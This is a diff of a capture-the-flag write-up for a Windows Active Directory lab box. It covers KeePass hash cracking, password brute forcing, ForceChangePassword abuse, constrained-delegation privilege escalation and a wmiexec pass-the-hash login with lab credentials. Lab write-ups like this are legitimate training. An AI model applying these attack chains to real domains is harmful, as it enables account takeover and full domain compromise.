@@ -10,16 +10,9 @@ tags:
   - windows
   - hard
   - ftp-anonymous-login
-  - password-deformation
-  - decode-kdbx
-  - mssql-login
-  - account-bruteforce
-  - bloodhound
   - bloodhound-ForceChangePassword
-  - Lateral-Movement-5985
   - windows-privilege-escalation-SeEnableDelegationPrivilege
-  - impersonate-token
-lastmod: 2026-02-28T07:51:33.719Z
+lastmod: 2026-04-03T15:31:07.168Z
 ---
 # Box Info
 
@@ -161,7 +154,7 @@ Nmap done: 1 IP address (1 host up) scanned in 75.86 seconds
 
 {{< toggle "Tag 🏷️" >}}
 
-{{< tag "ftp-anonymous-login" >}} Success login as `anonymous` for enumerating with binary mode to get the Shared.kdbx etc files.
+{{< tag "ftp-anonymous-login" >}} logining as anonymous for enumerating with binary mode to get the Shared.kdbx files ,founding weak password in the ftp share file TrainingAgenda.txt - SeasonYear! , create the password deformation wordlist for keepass2john to hash the Shared.kdbx ,so get the mssql password in the keepass database with the SQLGuest
 
 {{< /toggle >}}
 
@@ -250,12 +243,6 @@ Friday 25th October | 9.30 - 12.30 - 29 attendees
 
 ### Password deformation
 
-{{< toggle "Tag 🏷️" >}}
-
-{{< tag "password-deformation" >}} Found weak password in the ftp share file TrainingAgenda.txt - SeasonYear! , so can be guess the password
-
-{{< /toggle >}}
-
 ```
 └─# cat password 
 SeasonYear!
@@ -268,12 +255,6 @@ Autumn2024!
 ```
 
 ### keepass2john
-
-{{< toggle "Tag 🏷️" >}}
-
-{{< tag "decode-kdbx" >}} use the keepass2john to hash the Shared.kdbx for hashcat to decode the password with the mode 13400 ,so get the mssql password in the keepass database with the SQLGuest
-
-{{< /toggle >}}
 
 ```
 ┌──(haydon_env)─(root㉿kali)-[~/Desktop]
@@ -378,9 +359,29 @@ KdbxXmlReader::readDatabase: found 1 invalid group reference(s)
 
 {{< toggle "Tag 🏷️" >}}
 
-{{< tag "mssql-userenum" >}} use the netexec of --local-auth to verify the account and use the mssqlclient.py to local login to get thefull RID and the msfconsole will help we to auto enum the users
+{{< tag "mssql-userenum" >}} Using the netexec of --local-auth to verify the mssql account and use the mssqlclient.py to local login to get the full RID and the msfconsole will help we to auto enum the users, using the netexec with --continue-on-success  to bruteforce the account to do the LDAP enum with  rusthound-ce instead of the bloodhound
 
 {{< /toggle >}}
+
+{{< mindmap >}}
+
+# netexec
+
+* \--local-auth
+  * success
+
+# mssqlclient.py
+
+* user enum
+  * msfconsole
+    * username list
+
+# account-bruteforce
+
+* bloodhound
+  * rusthound-ce
+
+{{< /mindmap >}}
 
 Most of the creds don’t seem valid to anything I have access to at this point. The MSSQL creds do not work for SMB or as a Windows account:
 
@@ -567,11 +568,6 @@ sql_svc
 
 ### netexec bruteforce continue-on-success
 
-{{< toggle "Tag 🏷️" >}}
-
-{{< tag "account-bruteforce" >}} use the username : username wordlist to login successfully\
-{{< /toggle >}}
-
 always keep the password list is good thing , if use the password before , the next password enum may be is the same
 
 ```
@@ -592,11 +588,7 @@ The `netexec` show that i can rdp in , but i cant in , so the idea is run the bl
 
 ### rusthound-ce
 
-{{< toggle "Tag 🏷️" >}}
-
-{{< tag "bloodhound" >}} Install and run the rusthound-ce to collect the data from linux
-
-{{< /toggle >}}
+nstall and run the rusthound-ce to collect the data from linux
 
 use the netexec amd bloodhound-python also has the problem to collect the data , so use the rusthound-ce to collect the data
 
@@ -618,7 +610,7 @@ tar  -xzvf rusthound-ce-Linux-gnu-x86_64.tar.gz
 
 {{< toggle "Tag 🏷️" >}}
 
-{{< tag "bloodhound-ForceChangePassword" >}} The user has the ForceChangePassword to other user but need to check which account has the outblood dierection
+{{< tag "bloodhound-ForceChangePassword" >}} Finding Path of ForceChangePassword in bloodhound to users sbut only the HELEN.FORST  has the outblood dierection, using netexec 's  -M change-password  to have the target account, and use the evil-winrm-py to login
 
 {{< /toggle >}}
 
@@ -643,12 +635,6 @@ CHANGE-P... 10.129.234.50   445    DC               [+] Successfully changed pas
 # Shell as helen.frost
 
 ### evil-winrm-py
-
-{{< toggle "Tag 🏷️" >}}
-
-{{< tag "Lateral-Movement-5985" >}} login with evil-winrm-py which has more stable to login
-
-{{< /toggle >}}
 
 Load PowerShell functions from local scripts into the interactive shell. 🆕\
 Run local PowerShell scripts on the remote host. 🆕\
@@ -677,7 +663,7 @@ evil-winrm-py PS C:\Users\Helen.Frost\Documents>
 
 {{< toggle "Tag 🏷️" >}}
 
-{{< tag "windows-privilege-escalation-SeEnableDelegationPrivilege" >}} exploit constrained delegation by set up the TrustedToAuthForDelegation to set object msDS-AllowedToDelegateTo
+{{< tag "windows-privilege-escalation-SeEnableDelegationPrivilege" >}} Exploiting the SeEnableDelegationPrivilege by constrained delegation to set up the TrustedToAuthForDelegation through setting object msDS-AllowedToDelegateTo  ,impersonating the Administrator account and request a Service Ticket on its behalf for the www service on host server01.test.local, logging with the hash by wmiexec.py.
 
 {{< /toggle >}}
 
@@ -724,11 +710,6 @@ bloodyAD --host 10.129.234.50  -d redelegate.vl -u Helen.Frost -p 'Fall2024!' se
 ```
 
 ### getST.py
-
-{{< toggle "Tag 🏷️" >}}
-
-{{< tag "impersonate-token" >}}  impersonate the Administrator account and request a Service Ticket on its behalf for the www service on host server01.test.local\
-{{< /toggle >}}
 
 Impacket’s getST.py will request a Service Ticket and save it as ccache. If the account has constrained delegation privileges, you can use the `-impersonate` flag to request a ticket on behalf of another user. The following command will impersonate the Administrator account and request a Service Ticket on its behalf for the `www` service on host `server01.test.local`.\
 -spn\
@@ -779,7 +760,3 @@ A similar approach to smbexec but executing commands through WMI. # Main advanta
 ```
 wmiexec.py redelegate.vl/administrator@dc.redelegate.vl -hashes :ec17f7a2a4d96e177bfd101b94ffc0a7
 ```
-
-# learning Goal
-
-https://github.com/aniqfakhrul/powerview.py
